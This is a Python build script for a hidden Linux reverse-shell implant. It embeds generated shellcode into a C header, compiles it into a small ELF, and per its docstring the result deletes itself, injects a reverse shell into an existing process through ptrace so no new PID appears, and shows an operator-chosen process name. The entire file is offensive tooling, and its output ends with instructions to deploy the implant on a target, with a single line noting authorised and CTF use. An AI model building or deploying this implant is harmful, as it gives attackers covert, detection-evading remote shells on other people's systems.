#!/usr/bin/env python3
"""
Build the single-binary hidden reverse-shell implant.

    python3 make_shell.py <IP> <PORT> <NAME> [-o shell] [--static]

Produces ONE ELF that, when run on a pwned box, unlinks itself, then injects
an embedded x86-64 revshell into an existing process (no new PID appears).
If ptrace is unavailable (e.g. yama ptrace_scope) it falls back to running
in place, exactly like the plain minimal revshell.

Steps: generate the shellcode with shellcode.py, embed it as sc.h, compile
implant.c with gcc. Dynamic by default (~15 KB); use --static for a target
with no glibc. Requires nasm + gcc. Use only on systems and CTF targets
where you have authorization.
"""
from __future__ import annotations

import argparse
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

import shellcode as scgen

HERE = Path(__file__).resolve().parent


def emit_sc_h(ip: str, port: int, name: str) -> str:
    """Assemble the revshell bytes and render them as a C header."""
    with tempfile.TemporaryDirectory(prefix="scgen-") as td:
        tmp = Path(td)
        scgen.generate(ip, port, name, output=tmp / "sc.bin", asm_output=tmp / "sc.asm")
        data = (tmp / "sc.bin").read_bytes()

    lines = ["static const unsigned char sc[] = {"]
    for i in range(0, len(data), 12):
        lines.append("    " + ", ".join(f"0x{b:02x}" for b in data[i : i + 12]) + ",")
    lines.append("};")
    lines.append("static const size_t sc_len = sizeof(sc);")
    return "\n".join(lines) + "\n"


def check_tool(tool: str) -> bool:
    return shutil.which(tool) is not None


def build(
    ip: str,
    port: int,
    name: str,
    output: str | Path,
    static: bool,
) -> tuple[Path, int]:
    if not check_tool("gcc"):
        raise RuntimeError("gcc is not installed; cannot compile the implant")
    if not check_tool("nasm"):
        raise RuntimeError("NASM is not installed; cannot build the shellcode")

    (HERE / "sc.h").write_text(emit_sc_h(ip, port, name), encoding="ascii")

    out_path = Path(output)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    cmd = ["gcc", "-O2", "-s", "-Wall", "-Wextra",
           "-o", str(out_path), str(HERE / "implant.c"), "-pthread"]
    if static:
        cmd.insert(1, "-static")
    try:
        subprocess.run(cmd, check=True)
    except (OSError, subprocess.CalledProcessError) as exc:
        raise RuntimeError(f"gcc failed while building the implant: {exc}") from exc

    out_path.chmod(out_path.stat().st_mode | 0o111)
    return out_path, out_path.stat().st_size


def _port_argument(value: str) -> int:
    try:
        port = int(value, 10)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("port must be a decimal integer") from exc
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError("port must be from 1 to 65535")
    return port


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Build a single-binary hidden reverse shell for linux-memexec"
    )
    parser.add_argument("ip", help="IPv4 callback address")
    parser.add_argument("port", type=_port_argument, help="TCP callback port")
    parser.add_argument("name", help="argv[0] shown by process listings")
    parser.add_argument("-o", "--output", default="shell", help="implant output path (default: shell)")
    parser.add_argument(
        "--static",
        action="store_true",
        help="link statically (bigger, but no glibc needed on the target)",
    )
    args = parser.parse_args(argv)

    try:
        output, size = build(args.ip, args.port, args.name, args.output, args.static)
    except (OSError, TypeError, ValueError, RuntimeError) as exc:
        parser.error(str(exc))

    print(f"implant {output!s} built ({size} bytes).")
    print("deploy: copy it to the target and run: ./{0} [--pid PID | --name PROC]".format(output.name))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
